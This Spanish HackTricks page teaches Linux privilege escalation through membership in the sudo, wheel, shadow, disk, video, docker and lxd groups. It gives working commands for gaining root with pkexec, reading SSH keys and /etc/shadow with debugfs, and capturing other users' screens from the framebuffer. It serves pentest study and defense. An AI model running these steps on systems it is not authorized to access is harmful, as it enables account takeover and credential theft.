<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Grupos de Sudo/Administrador

## **PE - Método 1**

**A veces**, **por defecto \(o porque algún software lo requiere\)** dentro del archivo **/etc/sudoers** puedes encontrar algunas de estas líneas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirte en root simplemente puedes ejecutar**:
```text
sudo su
```
## PE - Método 2

Encuentra todos los binarios suid y verifica si está el binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Si descubres que el binario pkexec es un binario SUID y perteneces a sudo o admin, probablemente podrías ejecutar binarios como sudo utilizando pkexec.
Revisa el contenido de:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Encontrarás qué grupos tienen permitido ejecutar **pkexec** y **por defecto** en algunos linux pueden **aparecer** algunos de los grupos **sudo o admin**.

Para **convertirte en root puedes ejecutar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si intentas ejecutar **pkexec** y obtienes este **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y hay una solución para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones ssh diferentes**:

{% code title="sesión1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
```markdown
{% endcode %}

{% code title="session2" %}
```
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Grupo Wheel

**A veces**, **por defecto** dentro del archivo **/etc/sudoers** puedes encontrar esta línea:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirte en root solo tienes que ejecutar**:
```text
sudo su
```
# Grupo Shadow

Los usuarios del **grupo shadow** pueden **leer** el archivo **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Así que, lee el archivo e intenta **crackear algunos hashes**.

# Grupo de Disco

Este privilegio es casi **equivalente al acceso root** ya que puedes acceder a todos los datos dentro de la máquina.

Archivos: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Tenga en cuenta que utilizando debugfs también puede **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt` puede hacer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Sin embargo, si intentas **escribir archivos propiedad de root** \(como `/etc/shadow` o `/etc/passwd`\), tendrás un error de "**Permission denied**".

# Grupo Video

Usando el comando `w` puedes encontrar **quién está conectado al sistema** y mostrará una salida como la siguiente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
El **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.

El **grupo video** tiene acceso para ver la salida de pantalla. Básicamente, puedes observar las pantallas. Para hacer eso necesitas **capturar la imagen actual en la pantalla** en datos brutos y obtener la resolución que la pantalla está utilizando. Los datos de la pantalla se pueden guardar en `/dev/fb0` y podrías encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** la **imagen en bruto** puedes usar **GIMP**, selecciona el archivo **`screen.raw`** y elige como tipo de archivo **Datos de imagen en bruto**:

![](../../.gitbook/assets/image%20%28208%29.png)

Luego modifica el Ancho y Alto a los utilizados en la pantalla y verifica diferentes Tipos de Imagen \(y selecciona el que muestre mejor la pantalla\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Grupo Root

Parece que por defecto los **miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** u **otras cosas interesantes** que podrían usarse para escalar privilegios...

**Verifica qué archivos pueden modificar los miembros de root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Grupo Docker

Puedes montar el sistema de archivos raíz de la máquina anfitriona en el volumen de una instancia, de modo que cuando la instancia se inicia, inmediatamente carga un `chroot` en ese volumen. Esto efectivamente te da root en la máquina.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Grupo lxc/lxd

[lxc - Escalada de Privilegios](lxd-privilege-escalation.md)



<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
